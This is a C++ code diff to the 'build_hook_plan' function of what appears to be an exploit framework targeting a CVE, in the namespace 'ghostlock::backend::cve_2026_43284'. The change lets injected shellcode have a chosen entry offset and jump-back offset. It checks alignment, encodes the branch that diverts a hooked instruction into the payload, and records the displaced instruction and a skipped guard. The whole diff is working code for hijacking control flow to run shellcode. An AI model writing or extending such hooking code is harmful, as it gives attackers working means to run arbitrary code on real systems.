@@ -213,7 +213,8 @@ namespace ghostlock::backend::cve_2026_43284::steps {
     }
 
     bool build_hook_plan(const HookTarget &target, std::size_t shellcode_bytes, HookPlan &out,
-                         HookPlanError &error) noexcept {
+                         HookPlanError &error, std::size_t entry_offset,
+                         std::size_t jump_back_offset) noexcept {
         out = HookPlan{};
         error = HookPlanError::None;
         if (!target.valid) {
@@ -234,13 +235,30 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             error = HookPlanError::PayloadNotMapped;
             return false;
         }
+        /* The entry the hook branch targets must be a full aligned word inside
+         * the shellcode body. */
+        if ((entry_offset % 4U) != 0U || entry_offset + 4U > shellcode_bytes) {
+            error = HookPlanError::EntryOutOfRange;
+            return false;
+        }
+        /* The jump-back word goes either at the caller-named offset (the raw
+         * blob's own last word, e.g. libcxx.S) or, by default, at the last word
+         * of the padded image. */
+        const std::size_t jump_at = jump_back_offset == kShellcodeAutoJumpBack
+                                            ? padded - 4U
+                                            : jump_back_offset;
+        if ((jump_at % 4U) != 0U || jump_at + 4U > padded) {
+            error = HookPlanError::JumpBackOutOfRange;
+            return false;
+        }
         std::uint32_t branch = 0U;
-        if (!encode_branch(target.hook_vaddr, target.payload_vaddr, branch)) {
+        if (!encode_branch(target.hook_vaddr, target.payload_vaddr + entry_offset,
+                           branch)) {
             error = HookPlanError::BranchOutOfRange;
             return false;
         }
         std::uint32_t jump_back = 0U;
-        if (!encode_branch(target.payload_vaddr + padded - 4U, target.hook_vaddr + 4U,
+        if (!encode_branch(target.payload_vaddr + jump_at, target.hook_vaddr + 4U,
                            jump_back)) {
             error = HookPlanError::BranchOutOfRange;
             return false;
@@ -256,6 +274,8 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         out.displaced_instruction = target.displaced_instruction;
         out.guard_skipped = target.guard_skipped;
         out.guard_instruction = target.guard_instruction;
+        out.entry_offset = entry_offset;
+        out.jump_back_offset = jump_at;
         return true;
     }
 
